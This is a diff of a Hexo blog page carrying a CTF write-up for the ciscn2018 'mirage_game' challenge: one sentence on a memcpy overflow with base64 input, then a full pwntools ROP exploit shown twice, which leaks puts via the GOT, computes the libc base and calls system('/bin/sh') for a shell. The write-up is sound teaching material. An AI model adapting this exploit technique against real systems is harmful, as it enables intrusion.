@@ -1,7 +1,7 @@
 
  <!DOCTYPE HTML>
-<html >
-<head>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="UTF-8">
   
     <title>ciscn2018半决赛-mirage_game | Hexo</title>
@@ -26,13 +26,13 @@
     
     <link rel="stylesheet" href="/css/style.css">
 </head>
-
+</html>
   <body>
     <header>
       <div>
 		
 			<div id="imglogo">
-				<a href="/"><img src="/img/logo.svg" alt="Hexo" title="Hexo"/></a>
+				<a href="/"><img src="/img/logo.svg" alt="Hexo" title="Hexo"></a>
 			</div>
 			
 			<div id="textlogo">
@@ -52,7 +52,7 @@
 					
 					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
 						<label>Search</label>
-						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search">
 						<input type="hidden" name="q" value="site:lometsj.com">
 					</form>
 					
@@ -63,7 +63,7 @@
 
     </header>
     <div id="container">
-      <div id="main" class="post" itemscope itemprop="blogPost">
+      <div id="main" class="post" itemscope="" itemprop="blogPost">
 	<article itemprop="articleBody"> 
 		<header class="article-info clearfix">
   <h1 itemprop="name">
@@ -76,7 +76,7 @@
     </p>
   <p class="article-time">
     <time datetime="2018-07-16T06:39:18.000Z" itemprop="datePublished">2018-07-16</time>
-    Updated:<time datetime="2018-07-16T06:50:27.609Z" itemprop="dateModified">2018-07-16</time>
+    Updated:<time datetime="2018-07-16T06:50:27.000Z" itemprop="dateModified">2018-07-16</time>
     
   </p>
 </header>
@@ -89,7 +89,7 @@
 		</div>
 		
 		<p>程序是一个简单的memcpy溢出,需要注意一次base64转换,通过puts泄漏地址计算libc_base,构造system(“/bin/sh”)即可</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> base64</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"><span class="comment">#0x0000000000403383 : pop rdi ; ret</span></div><div class="line"></div><div class="line">io = process(<span class="string">'./mirage_game'</span>)</div><div class="line">elf = ELF(<span class="string">'./mirage_game'</span>)</div><div class="line">lib = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class="line">write_got = elf.got[<span class="string">'write'</span>]</div><div class="line">read_got = elf.got[<span class="string">'read'</span>]</div><div class="line"></div><div class="line"></div><div class="line">pre = <span class="string">'RPCM'</span></div><div class="line">pre += <span class="string">'\x00\x00\x00\x0c'</span></div><div class="line">pre += <span class="string">'\x00\x00\x00\x00'</span></div><div class="line">io.send(pre)</div><div class="line">io.recv(<span class="number">12</span>)</div><div class="line"></div><div class="line"></div><div class="line">payload = <span class="string">'RPCM'</span></div><div class="line">payload += <span class="string">'\x00\x00\x00\x0c'</span></div><div class="line">payload += <span class="string">'\x00\x00\x00\x42'</span></div><div class="line">fakeebp = <span class="string">'b'</span> * <span class="number">8</span></div><div class="line">io.send(payload)</div><div class="line"></div><div class="line"></div><div class="line">io.recvuntil(<span class="string">':)\n'</span>)</div><div class="line"></div><div class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x30</span> + fakeebp</div><div class="line">payload1 += p64(<span class="number">0x403383</span>)  +p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.plt[<span class="string">'puts'</span>]) + p64(elf.symbols[<span class="string">'sfadkjf'</span>])</div><div class="line">payload1 = base64.b64encode(payload1)</div><div class="line">io.sendline(payload1)</div><div class="line">r = io.recv()</div><div class="line"></div><div class="line">write_addr = u64(r.split(<span class="string">'\n'</span>)[<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"puts_addr: "</span> + hex(write_addr)</div><div class="line">libc_base = write_addr - lib.symbols[<span class="string">'puts'</span>]</div><div class="line">system_addr = libc_base + lib.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">payload2 = <span class="string">'a'</span> * <span class="number">0x30</span> + fakeebp</div><div class="line"><span class="keyword">print</span> hex(lib.search(<span class="string">'/bin/sh'</span>).next())</div><div class="line">payload2 += p64(<span class="number">0x403383</span>) + p64(libc_base + lib.search(<span class="string">'/bin/sh'</span>).next()) + p64(system_addr)</div><div class="line">payload2 = base64.b64encode(payload2)</div><div class="line">io.sendline(payload2)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#0x0000000000403383 : pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./mirage_game'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./mirage_game'</span>)</span><br><span class="line">lib = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pre = <span class="string">'RPCM'</span></span><br><span class="line">pre += <span class="string">'\x00\x00\x00\x0c'</span></span><br><span class="line">pre += <span class="string">'\x00\x00\x00\x00'</span></span><br><span class="line">io.send(pre)</span><br><span class="line">io.recv(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'RPCM'</span></span><br><span class="line">payload += <span class="string">'\x00\x00\x00\x0c'</span></span><br><span class="line">payload += <span class="string">'\x00\x00\x00\x42'</span></span><br><span class="line">fakeebp = <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">':)\n'</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x30</span> + fakeebp</span><br><span class="line">payload1 += p64(<span class="number">0x403383</span>)  +p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.plt[<span class="string">'puts'</span>]) + p64(elf.symbols[<span class="string">'sfadkjf'</span>])</span><br><span class="line">payload1 = base64.b64encode(payload1)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">r = io.recv()</span><br><span class="line"></span><br><span class="line">write_addr = u64(r.split(<span class="string">'\n'</span>)[<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_addr: "</span> + hex(write_addr)</span><br><span class="line">libc_base = write_addr - lib.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + lib.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span> * <span class="number">0x30</span> + fakeebp</span><br><span class="line"><span class="keyword">print</span> hex(lib.search(<span class="string">'/bin/sh'</span>).next())</span><br><span class="line">payload2 += p64(<span class="number">0x403383</span>) + p64(libc_base + lib.search(<span class="string">'/bin/sh'</span>).next()) + p64(system_addr)</span><br><span class="line">payload2 = base64.b64encode(payload2)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -108,9 +108,9 @@
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
+ <div class="prev">
  <a href="/posts/6a17cd88/" title="defcon2015-r0pbaby">
-  <strong>PREVIOUS:</strong><br/>
+  <strong>PREVIOUS:</strong><br>
   <span>
   defcon2015-r0pbaby</span>
 </a>
@@ -118,8 +118,8 @@
 
 
 <div class="next">
-<a href="/posts/4bd00c2d/"  title="ccz">
- <strong>NEXT:</strong><br/> 
+<a href="/posts/4bd00c2d/" title="ccz">
+ <strong>NEXT:</strong><br> 
  <span>ccz
 </span>
 </a>
@@ -151,7 +151,7 @@
 </aside>
 </div>
     </div>
-    <footer><div id="footer" >
+    <footer><div id="footer">
 	
 	<div class="line">
 		<span></span>
